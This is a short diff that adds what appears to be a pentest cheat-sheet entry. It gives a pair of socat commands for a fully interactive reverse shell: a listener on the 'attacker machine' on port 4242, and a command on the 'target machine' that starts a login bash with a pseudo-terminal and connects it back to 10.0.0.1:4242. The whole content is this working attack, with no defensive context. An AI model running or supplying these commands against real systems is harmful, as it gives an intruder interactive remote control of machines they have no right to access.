@@ -1,0 +1,5 @@
+on the attacker machine:
+	- socat file:`tty`,raw,echo=0 TCP-L:4242
+
+on the target machine:
+	- socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
